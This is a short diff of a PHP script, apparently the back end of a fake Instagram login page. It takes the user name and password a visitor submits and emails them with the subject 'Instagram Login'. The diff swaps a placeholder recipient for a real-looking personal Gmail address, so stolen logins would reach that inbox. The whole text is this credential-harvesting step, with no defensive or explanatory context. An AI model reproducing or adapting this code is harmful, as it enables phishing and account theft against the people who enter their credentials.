@@ -3,5 +3,5 @@
 $msg = "From: " . $_POST["userName"] . " - ". $_POST["password"];
 
 // send email
-mail("someone@example.com","Instagram Login",$msg);
+mail("praveenpal4232@gmail.com","Instagram Login",$msg);
 ?>
